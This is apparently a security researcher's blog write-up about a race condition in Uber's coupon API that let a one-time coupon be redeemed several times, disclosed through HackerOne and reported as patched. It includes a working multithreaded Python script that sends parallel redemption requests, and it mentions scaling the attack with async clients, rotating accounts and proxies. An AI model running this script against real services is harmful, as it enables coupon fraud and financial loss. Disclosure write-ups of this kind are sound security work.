---
title: "12:57 AM and a Concurrency Fault: How I Exploited Uber’s Coupon Redemption Logic"
description: "A late-night observation turned into a race condition vulnerability within Uber’s coupon API. This is the story of how precise timing and parallel requests bypassed intended one-time restrictions."
date: 2023-06-13
categories: ["Security Research", "Concurrency Vulnerabilities", "API Exploitation"]
tags: ["Uber", "Race Condition", "Coupon Abuse", "Threading", "Timing Attack"]
header:
  image: "/images/uber-coupon-race.jpg"
  caption: "The race window – milliseconds of opportunity within backend logic"
---

## **Prologue: 12:57 AM**
---

The apartment was quiet. I was not hunting vulnerabilities or replaying traffic with aggressive fuzzing. It was more observational – that rare and quiet mindset that often reveals misbehavior where others only see clean execution.

On one side of my screen was Uber’s app. On the other, Burp Suite running silently, intercepting HTTP requests in passive mode...

That difference in timing triggered a deeper question.

Was the backend state being updated only after the coupon logic passed?
Was the validation being done after the request hit the endpoint – instead of ahead of it?

The hypothesis was simple: if two identical requests were sent at the exact same moment, would both pass the validation check before either had the chance to mark the coupon as used?

This was the beginning of the race condition theory.

## **Chapter One: Analyzing the Endpoint**
---

Using Burp Suite, I intercepted the coupon redemption API call. The structure was standard.

```http
POST /api/redeem HTTP/1.1
Host: api.uber.com
Authorization: Bearer <access_token>
Content-Type: application/json

{
  "coupon_code": "FIRST100"
}
```

The server responded:

```json
{
  "status": "success",
  "message": "Coupon FIRST100 applied successfully."
}
```

Subsequent attempts failed with:

```json
{
  "status": "failed",
  "message": "This coupon has already been redeemed."
}
```

## **Chapter Two: Understanding the Vulnerability**
---

Most race conditions arise from shared state without proper synchronization.

```python
if coupon.is_valid and not coupon.is_used:
    apply_coupon_to_account(user)
    coupon.is_used = True
```

This appears correct, but it fails under concurrency.

## **Chapter Three: Building the Exploit**
---

I wrote a multithreaded Python script to fire concurrent requests using the same coupon code.

```python
import requests
import threading

url = "https://api.uber.com/api/redeem"
headers = {
    "Authorization": "Bearer <ACCESS_TOKEN>",
    "Content-Type": "application/json"
}
data = { "coupon_code": "FIRST100" }

def send_request():
    response = requests.post(url, json=data, headers=headers)
    print(response.text)

threads = []

for _ in range(20):
    t = threading.Thread(target=send_request)
    threads.append(t)
    t.start()

for t in threads:
    t.join()
```

## **Chapter Four: Scaling the Attack**
---

To test scalability, I tried:

- Async versions using `aiohttp`
- High-value and low-value coupons
- Account-bound and public promo codes

## **Chapter Five: Real-World Impact**
---

**Coupon Limit Bypass:** One-time-use coupons were redeemable multiple times.

**Financial Abuse:** Discounts and ride credits could be multiplied.

**Automation Risk:** Scripts with rotating accounts and proxies could cause loss.

**Detection Difficulty:** Requests appeared legitimate in isolation.

## **Chapter Six: Measuring the Race Window**
---

Measured with timestamps:

- Minimum: 90 ms
- Average: 180–220 ms
- Max: ~300 ms

## **Chapter Seven: Responsible Disclosure**
---

Submitted via HackerOne with:

- Technical breakdown
- Proof-of-concept
- Suggested fixes

Uber confirmed, patched, and validated the fix.



## **Even milliseconds matter.**


